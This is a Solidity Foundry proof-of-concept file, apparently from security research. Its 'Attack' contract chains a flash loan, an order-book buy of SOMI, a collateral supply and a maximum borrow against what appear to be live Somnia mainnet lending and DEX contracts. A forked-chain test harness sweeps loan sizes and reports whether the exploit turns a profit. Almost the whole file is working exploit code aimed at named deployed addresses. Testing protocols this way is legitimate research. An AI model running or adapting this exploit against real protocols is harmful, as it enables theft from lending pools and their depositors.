// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function decimals() external view returns (uint8);
    function approve(address, uint256) external returns (bool);
}

interface IWrappedNative {
    function deposit() external payable;
}

interface IAaveOracle {
    function getAssetPrice(address) external view returns (uint256);
    function getSourceOfAsset(address) external view returns (address);
    function FLASHLOAN_PREMIUM_TOTAL() external view returns (uint256);
}

interface IPool {
    function FLASHLOAN_PREMIUM_TOTAL() external view returns (uint256);
    function flashLoanSimple(address, address, uint256, bytes calldata, uint16) external;
    function supply(address, uint256, address, uint16) external;
    function borrow(address, uint256, uint256, uint16, address) external;
    function getConfiguration(address) external view returns (uint256);
    function getUserAccountData(address)
        external
        view
        returns (uint256 collateral, uint256 debt, uint256 available, uint256 liqThreshold, uint256 ltv, uint256 hf);
}

interface IClob {
    struct Level {
        uint256 price;
        uint256 quantity;
    }
    function getPoolParams() external view returns (address, address, uint256, uint256, uint256, uint256, uint256);
    function getBookLevels(bool isBid, uint64 n) external view returns (Level[] memory);
    function getAutoPullRequirement(address, bool, uint256, uint256, uint96)
        external
        view
        returns (address, uint256, uint256);
    function placeOrder(bool, uint64, uint256, uint256, uint64, uint8, uint8, address, uint96)
        external
        payable
        returns (bool, uint128);
}

/// @dev Everything the run measured, carried out of the transaction in the revert payload.
///      A revert rolls back storage, so reading these back through view getters afterwards
///      returns zeros - that is the trap this struct avoids.
struct Metrics {
    uint256 flashAmount;
    uint256 premiumBps;
    uint256 repayment;
    uint256 oracleBefore;
    uint256 oracleAfter;
    uint256 askBefore;
    uint256 askAfter;
    uint256 bidBefore;
    uint256 bidAfter;
    uint256 somiBought;
    uint256 usdsoSpent;
    uint256 execPrice; // USDso per SOMI, 18 decimals
    uint256 supplied;
    uint256 ltvBps;
    uint256 borrowPowerUsdso; // converted out of the 8-decimal Aave base
    uint256 borrowedUsdso;
    uint256 unspentUsdso; // flash principal never spent on the book
    uint256 availableUsdso; // everything actually on hand at repayment time
    uint256 coverageBps; // available / repayment, 10_000 = exactly solvent
    uint256 shortfall;
    int256 edgeRealizedBps; // + = bought below oracle, - = bought above
    uint256 edgeRequiredBps; // what the LTV arithmetic demands
}

/// @notice Zero-seed: flash USDso -> IOC buy SOMI on dreamDEX -> wrap -> supply WSOMI ->
///         borrow max USDso -> repay the flash, all inside one transaction.
contract Attack {
    address constant POOL = 0xEC6758e6324c167DB39B6908036240460a2b0168;
    address constant ORACLE = 0x9b7B5d69a08071ce74C2f3D655038E3b782eAaFc;
    address constant WSOMI = 0x046EDe9564A72571df6F5e44d0405360c0f4dCab;
    address constant USDSO = 0x00000022dA000002656c64D9eA6011ea952D008A;
    address constant MARKET = 0x035De7403eac6872787779CCA7CCF1b4CDb61379;

    uint256 constant BPS = 10_000;
    uint8 constant IOC = 2;
    uint8 constant SELF_CANCEL_TAKER = 0;

    address public immutable owner = msg.sender;

    Metrics internal m;
    uint256 internal limitBps;

    error Shortfall(Metrics m);

    function run(uint256 amount, uint256 limitBps_) external {
        require(msg.sender == owner, "owner");
        limitBps = limitBps_;
        m.flashAmount = amount;
        m.premiumBps = IPool(POOL).FLASHLOAN_PREMIUM_TOTAL();
        m.repayment = amount + (amount * m.premiumBps) / BPS;
        m.oracleBefore = IAaveOracle(ORACLE).getAssetPrice(WSOMI);
        m.bidBefore = _best(true);
        m.askBefore = _best(false);

        IPool(POOL).flashLoanSimple(address(this), USDSO, amount, "", 0);
    }

    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata)
        external
        returns (bool)
    {
        require(msg.sender == POOL && initiator == address(this), "only pool");
        require(asset == USDSO && amount == m.flashAmount && premium == m.repayment - m.flashAmount, "bad flash");

        _buy(amount);
        _supplyAndBorrow();
        _settle(amount);
        return true;
    }

    // ---- 1. real IOC buy of native SOMI against the live ask book ----
    function _buy(uint256 amount) internal {
        (,,,, uint256 tick, uint256 minQty, uint256 lot) = IClob(MARKET).getPoolParams();
        uint256 limit = ((m.askBefore * limitBps) / BPS / tick) * tick + tick;
        uint256 qty = _sizeBuy(limit, amount, lot);
        if (qty == 0 || qty < minQty) _fail();

        (address input, uint256 required,) = IClob(MARKET).getAutoPullRequirement(address(this), true, limit, qty, 0);
        if (input != USDSO || required > amount) _fail();
        IERC20(USDSO).approve(MARKET, required);

        uint256 nativeBefore = address(this).balance;
        uint256 quoteBefore = IERC20(USDSO).balanceOf(address(this));
        (bool ok,) = IClob(MARKET).placeOrder(
            true, 0, limit, qty, uint64((block.timestamp + 300) * 1e9), IOC, SELF_CANCEL_TAKER, address(0), 0
        );
        if (!ok) _fail();
        m.somiBought = address(this).balance - nativeBefore;
        m.usdsoSpent = quoteBefore - IERC20(USDSO).balanceOf(address(this));
        if (m.somiBought == 0 || m.usdsoSpent == 0) _fail();
        m.execPrice = (m.usdsoSpent * 1e18) / m.somiBought;

        // 2. same-transaction oracle reread, after the trade
        m.oracleAfter = IAaveOracle(ORACLE).getAssetPrice(WSOMI);
        m.askAfter = _best(false);
        m.bidAfter = _best(true);
    }

    // ---- 3+4. wrap, supply, borrow the maximum of the reserve the flash must be repaid in ----
    function _supplyAndBorrow() internal {
        IWrappedNative(WSOMI).deposit{value: m.somiBought}();
        m.supplied = m.somiBought;
        IERC20(WSOMI).approve(POOL, m.somiBought);
        IPool(POOL).supply(WSOMI, m.somiBought, address(this), 0);
        m.ltvBps = IPool(POOL).getConfiguration(WSOMI) & 0xffff;

        (,, uint256 available,,,) = IPool(POOL).getUserAccountData(address(this));
        // Aave reports the base currency with 8 decimals; keep the 18-decimal side too so the
        // coverage arithmetic never mixes units again.
        m.borrowPowerUsdso = available * 1e10;

        uint256 price = IAaveOracle(ORACLE).getAssetPrice(USDSO);
        uint256 budget = available - (available / 1_000_000) - 1; // HF guard epsilon
        m.borrowedUsdso = (budget * 1e18) / price;
        if (m.borrowedUsdso > 0) IPool(POOL).borrow(USDSO, m.borrowedUsdso, 2, 0, address(this));
    }

    // ---- 5. price the repayment, then repay or report exactly how short ----
    function _settle(uint256 amount) internal {
        uint256 have = IERC20(USDSO).balanceOf(address(this));
        m.unspentUsdso = amount > m.usdsoSpent ? amount - m.usdsoSpent : 0;
        m.availableUsdso = have;
        m.coverageBps = (have * BPS) / m.repayment;
        m.edgeRealizedBps = _edge(m.oracleBefore, m.execPrice);
        m.edgeRequiredBps = m.ltvBps == 0 ? type(uint256).max : ((BPS + m.premiumBps) * BPS) / m.ltvBps - BPS;

        if (have < m.repayment) {
            m.shortfall = m.repayment - have;
            _fail();
        }
        IERC20(USDSO).approve(POOL, m.repayment);
    }

    /// @dev signed edge of the executed price against the oracle: positive means we bought cheap.
    function _edge(uint256 oracle8, uint256 exec18) internal pure returns (int256) {
        if (oracle8 == 0) return 0;
        int256 o = int256(oracle8 * 1e10);
        return ((o - int256(exec18)) * int256(BPS)) / o;
    }

    /// @dev Revert with the metrics instead of a bare error, so a losing run still measures.
    function _fail() internal view {
        revert Shortfall(m);
    }

    function metrics() external view returns (Metrics memory) {
        return m;
    }

    function _best(bool isBid) internal view returns (uint256) {
        IClob.Level[] memory l = IClob(MARKET).getBookLevels(isBid, 1);
        return l.length == 0 ? 0 : l[0].price;
    }

    function _sizeBuy(uint256 limit, uint256 budget, uint256 lot) internal view returns (uint256 q) {
        IClob.Level[] memory asks = IClob(MARKET).getBookLevels(false, 50);
        uint256 spent;
        for (uint256 i; i < asks.length; ++i) {
            if (asks[i].price == 0 || asks[i].price > limit) break;
            uint256 cost = (asks[i].price * asks[i].quantity) / 1e18;
            if (spent + cost <= budget) {
                q += asks[i].quantity;
                spent += cost;
            } else {
                q += ((budget - spent) * 1e18) / asks[i].price;
                break;
            }
        }
        q = (q / lot) * lot;
        for (uint256 i; i < 4 && q > 0; ++i) {
            (, uint256 req,) = IClob(MARKET).getAutoPullRequirement(address(this), true, limit, q, 0);
            if (req <= budget) return q;
            q = ((q * budget) / req / lot) * lot;
        }
        return 0;
    }

    receive() external payable {}
}

contract SomniaPoC is Test {
    address constant POOL = 0xEC6758e6324c167DB39B6908036240460a2b0168;
    address constant WSOMI = 0x046EDe9564A72571df6F5e44d0405360c0f4dCab;
    address constant USDSO = 0x00000022dA000002656c64D9eA6011ea952D008A;
    address constant MARKET = 0x035De7403eac6872787779CCA7CCF1b4CDb61379;

    uint256 constant BPS = 10_000;

    /// @dev The fork comes from the command line, not from here: one source of truth for the block.
    function setUp() public view {
        require(block.chainid == 5031, "not Somnia: pass --fork-url and --fork-block-number");
    }

    function test_attack() public {
        console2.log("block", block.number);
        _gate(WSOMI, "SOMI");
        _gate(USDSO, "USDso");
        _depth();
        _sweep();
    }

    // ---------------------------------------------------------------- sweep

    /// @notice Run the whole attack at several flash sizes. Every attempt that cannot repay
    ///         reverts and is rolled back, so each size starts from the same untouched fork.
    function _sweep() internal {
        uint256[] memory sizes = _sizes();
        uint256 bestCov;
        uint256 bestSize;
        uint256 bestRepay;

        for (uint256 i; i < sizes.length; ++i) {
            (Metrics memory m, bool repaid) = _attempt(sizes[i]);
            if (m.flashAmount == 0) {
                console2.log("  size", sizes[i], "reverted without metrics");
                continue;
            }
            console2.log("=== FLASH USDso", sizes[i]);
            _report(m);
            console2.log("  REPAID?", repaid);
            if (m.coverageBps > bestCov) {
                bestCov = m.coverageBps;
                bestSize = sizes[i];
                bestRepay = m.repayment;
            }
        }

        console2.log("=== SUMMARY");
        console2.log("  best coverage bps", bestCov);
        console2.log("  at flash size USDso", bestSize);
        console2.log("  repayment due at that size", bestRepay);
        console2.log("  break even needs bps", BPS);
        console2.log("  still short by bps", bestCov >= BPS ? 0 : BPS - bestCov);
        console2.log("  verdict", bestCov >= BPS ? "PROFITABLE" : "UNPROFITABLE AT EVERY SIZE");
    }

    /// @dev FLASH_USDSO pins a single size; otherwise the ladder below is used.
    function _sizes() internal view returns (uint256[] memory s) {
        uint256 pinned = vm.envOr("FLASH_USDSO", uint256(0));
        if (pinned > 0) {
            s = new uint256[](1);
            s[0] = pinned;
            return s;
        }
        s = new uint256[](6);
        s[0] = 100e18;
        s[1] = 500e18;
        s[2] = 1_000e18;
        s[3] = 5_000e18;
        s[4] = 25_000e18;
        s[5] = 100_000e18;
    }

    /// @dev One attempt. Returns the metrics either way; the second flag says whether the
    ///      flash was actually repaid inside the call.
    function _attempt(uint256 amount) internal returns (Metrics memory m, bool repaid) {
        Attack a = new Attack();
        try a.run(amount, vm.envOr("LIMIT_BPS", uint256(10_050))) {
            return (a.metrics(), true);
        } catch (bytes memory err) {
            Metrics memory got = _decode(err);
            if (got.flashAmount == 0) _explain(err);
            return (got, false);
        }
    }

    function _decode(bytes memory err) internal pure returns (Metrics memory m) {
        if (err.length < 4) return m;
        bytes4 sel;
        assembly {
            sel := mload(add(err, 32))
        }
        if (sel != Attack.Shortfall.selector) return m;
        bytes memory body = new bytes(err.length - 4);
        for (uint256 i; i < body.length; ++i) body[i] = err[i + 4];
        return abi.decode(body, (Metrics));
    }

    /// @dev A revert that did not carry Metrics is still information: print the selector and,
    ///      when it is a standard Error(string), the reason. Otherwise say where it came from.
    function _explain(bytes memory err) internal {
        if (err.length < 4) {
            console2.log("  revert with no data (or out of gas at this size)");
            return;
        }
        bytes4 sel;
        assembly {
            sel := mload(add(err, 32))
        }
        console2.log("  revert selector", uint32(sel));
        bytes memory body = new bytes(err.length - 4);
        for (uint256 i; i < body.length; ++i) body[i] = err[i + 4];
        if (sel == 0x08c379a0) {
            // Error(string)
            console2.log("  Error(string):", abi.decode(body, (string)));
        } else if (sel == 0x4e487b71) {
            // Panic(uint256)
            console2.log("  Panic(uint256):", abi.decode(body, (uint256)));
        } else {
            console2.log("  custom error, payload bytes", body.length);
        }
    }

    // ---------------------------------------------------------------- report

    function _report(Metrics memory m) internal pure {
        console2.log("--- flash");
        console2.log("  principal USDso", m.flashAmount);
        console2.log("  premium bps", m.premiumBps);
        console2.log("  repayment due USDso", m.repayment);

        console2.log("--- fill");
        console2.log("  best ask before", m.askBefore);
        console2.log("  best ask after ", m.askAfter);
        console2.log("  ASK MOVE BPS", _move(m.askBefore, m.askAfter));
        console2.log("  best bid before", m.bidBefore);
        console2.log("  best bid after ", m.bidAfter);
        console2.log("  SOMI bought (wei)", m.somiBought);
        console2.log("  USDso spent", m.usdsoSpent);
        console2.log("  realized exec price (USDso per SOMI)", m.execPrice);

        console2.log("--- oracle");
        console2.log("  before", m.oracleBefore);
        console2.log("  after ", m.oracleAfter);
        console2.log("  ORACLE MOVE BPS", _move(m.oracleBefore, m.oracleAfter));

        console2.log("--- collateral");
        console2.log("  supplied WSOMI", m.supplied);
        console2.log("  ltv bps", m.ltvBps);
        console2.log("  borrow power USDso", m.borrowPowerUsdso);

        console2.log("--- repayment");
        console2.log("  borrowed USDso", m.borrowedUsdso);
        console2.log("  unspent flash USDso", m.unspentUsdso);
        console2.log("  available USDso", m.availableUsdso);
        console2.log("  shortfall USDso", m.shortfall);

        console2.log("--- verdict");
        console2.log("  COVERAGE bps", m.coverageBps);
        console2.log("  EDGE REALIZED bps", m.edgeRealizedBps);
        console2.log("  EDGE REQUIRED bps", m.edgeRequiredBps);
    }

    /// @notice edge required = (1 + flash premium) / LTV - 1: the discount the trade must buy at.
    function _gate(address asset, string memory label) internal view {
        uint256 cfg = IPool(POOL).getConfiguration(asset);
        uint256 ltv = cfg & 0xffff;
        uint256 threshold = (cfg >> 16) & 0xffff;
        uint256 prem = IPool(POOL).FLASHLOAN_PREMIUM_TOTAL();
        console2.log("--- gate", label);
        console2.log("  ltv bps", ltv);
        console2.log("  liquidation threshold bps", threshold);
        console2.log("  EDGE REQUIRED bps", ltv == 0 ? type(uint256).max : ((BPS + prem) * BPS) / ltv - BPS);
        console2.log("  oracle price", IAaveOracle(0x9b7B5d69a08071ce74C2f3D655038E3b782eAaFc).getAssetPrice(asset));
    }

    /// @notice how much USDso it takes to walk the ask book, and how far it walks.
    function _depth() internal view {
        IClob.Level[] memory asks = IClob(MARKET).getBookLevels(false, 20);
        if (asks.length == 0) return;
        uint256 notional;
        for (uint256 i; i < asks.length; ++i) notional += (asks[i].price * asks[i].quantity) / 1e18;
        uint256 best = asks[0].price;
        uint256 worst = asks[asks.length - 1].price;
        console2.log("--- depth");
        console2.log("  ask levels", asks.length);
        console2.log("  best ask", best);
        console2.log("  worst ask", worst);
        console2.log("  walk bps", ((worst - best) * BPS) / best);
        console2.log("  cumulative USDso needed", notional);
    }

    function _move(uint256 before_, uint256 after_) internal pure returns (uint256) {
        if (before_ == 0 || after_ <= before_) return 0;
        return ((after_ - before_) * BPS) / before_;
    }
}
